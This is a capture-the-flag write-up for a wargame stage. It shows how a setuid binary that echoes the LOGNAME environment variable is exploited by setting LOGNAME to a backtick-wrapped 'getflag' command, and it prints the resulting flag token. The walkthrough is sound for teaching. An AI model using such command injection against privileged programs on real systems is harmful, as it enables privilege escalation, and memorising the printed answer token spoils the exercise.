## Exploring the exercice

```bash 
$ ls -la
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
```

We have an executable. Since we can execute the level07 let's try it.

```bash 
$ ./level07 
level07
```

Okay so the executable displays something, probably with echo or ls. 

```bash 
$ file level07 
level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x26457afa9b557139fa4fd3039236d1bf541611d0, not stripped
```

I thought about creating a custom 'echo' and adding it to the PATH like level03 but it wasn't that. 
Instead let's look if the echo is done in any particular way. 


```bash 
$ strings level07 
[...]
LOGNAME
/bin/echo %s 
[...]
```

Okay so we see that the echo depends on an env variable. 

```bash 
$ env | grep LOGNAME 
LOGNAME=level07
```

Same principle as before we are going to inject getflag as a variable. 

```bash 
$ export LOGNAME=\`getflag\`
```

Check if it worked correctly 

```bash 
$ env | grep LOGNAME 
LOGNAME=`getflag`
```

And let's execute the script

```bash 
$ ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
